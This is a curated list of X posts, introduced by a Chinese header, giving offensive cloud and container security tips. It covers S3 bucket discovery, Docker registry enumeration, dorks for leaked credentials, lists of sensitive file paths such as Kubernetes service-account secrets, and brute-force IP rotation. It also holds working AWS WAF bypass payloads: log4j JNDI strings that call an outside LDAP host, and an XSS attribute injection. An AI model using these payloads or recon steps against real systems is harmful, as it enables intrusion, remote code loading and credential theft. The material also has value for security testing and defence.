# X 语料 · 云与容器（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[云安全](../cloud/cloud-security.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-cloud（17 条） · 本文 80 行

- strings can be applied on the apk build too, which reduces manual effort.
  strings example.apk | grep "firebaseio"
  strings example.apk | grep "s3."
  (For s3 buckets)
- when you are testing Android application always look into `shared_prefs` directory. Sometimes you will find open storage bucket.
- Find out AWS S3 bucket name:
  1) Find any CDN object URL
  2) Append below string to after URL:
  `?AWSAccessKeyId=[Valid_ACCESS_KEY_ID]&Expires=1766972005&Signature=ccc`
  and you will get the bucket name.
  https://dzone.com/articles/api-security-weekly-issue-48
- Successful Brute Forcing: IP Blocking Bypass
  1. To bypass this protection . Go to amazon, create account.
  2. From EC2 APIgateway get secret/access key
  3. In Burp Suite install ip rotate and past AWS key.
  Run attack.
- Anonymous Docker Image API/Repo
  /healthz - ok!
  /v2/_catalog -> repo name list
  /v2/{repo/name}/tags/list - list of tags for repo
  /v2/{repo/name}/manifests/{tag} - manifest with blob ids
  /v2/{repo/name}/blobs/sha256:id - > downloading all the blob, tar.gz compressed
- $ cat alive-hosts.txt | httpx -status-code --path .s3.amazonaws.com
- fast brute force to find targets s3 bucket
  ffuf -request req -w wordlist.txt -u "https://anybucket.s3.amazonaws.com" -t 300 -fc 404,400
  req file contains a s3 bucket request, you have to add FUZZ word to the host header Host: http://FUZZ.s3.amazonaws.com
- Just bypassed AWS WAF for log4j jndi injection:
  ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}
- AWS WAF bypass, another variant:
  ${jnd${123%25ff:-${123%25ff:-i:}}ldap://mydogsbutt.com:1389/o}
- Finding Sensitive Files
  — /proc/self/cwd/index.php
  — /proc/self/cwd/main.py
  — /etc/motd
  — /proc/net/udp
  — /proc/net/arp
  — /proc/self/environ
  — /var/run/secrets/kubernetes.io/serviceaccount
  — /proc/cmdline
- Github leak for Aws,jira,okta etc
  1. Org:"target" pwd/pass/passwd/password
  2. "target. atlassian" pwd/pass/passwd/password
  3. "target. okta" pwd/pass/passwd/password
  4. "Jira. target" pwd/pass/passwd/password
  target means only company. Not [.]com
- Google Dorks - Cloud Storage:
  site:http://s3.amazonaws.com "target[.]com"
  site:http://blob.core.windows.net "target[.]com"
  site:http://googleapis.com "target[.]com"
  site:http://drive.google.com "target[.]com"
- Google dorks to look for domains on a specific target
  intext:"© 2020 TARGET Inc. All rights reserved"
  same target diff countries
  site:"http://target.com.*"
  aws s3 buckets
  site:.s3.amazonaws.com "TARGET "
- /docker-compose.yml
  Check for docker-compose.yml endpoint, it may expose sensitive data.
- Add /api/.env to the wordlist, and maybe you will have access to dotenv file environment that leads to exposing SMTP credentials and AWS access key , secret key
- Find interesting subdomains:
  subfinder -d http://site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|sandbox\|qa\|intra\|s3\|back'
- Amazon S3 bucket Misconfiguration
  Ways to find open buckets for your target :
  1. Using this tool https://github.com/initstring/cloud_enum
  2. Using this website https://buckets.grayhatwarfare.com , blocked in many countries make sure to use VPN
- A quick way to scan for the s3 bucket list:
  s3scanner -bucket-file s3-buckets.txt -threads 16 | grep -aE 'Read|Write|Full' | tee results.txt
- AWS WAF bypass; works on all tags even the meta tag. (but not for input:hidden)
  <xhzeem attr="
  ---
  x="=='='onmouseover=confirm`xhzeem` style="display:block;width:1000px;height:1000px;background:red">
  ---
  ">
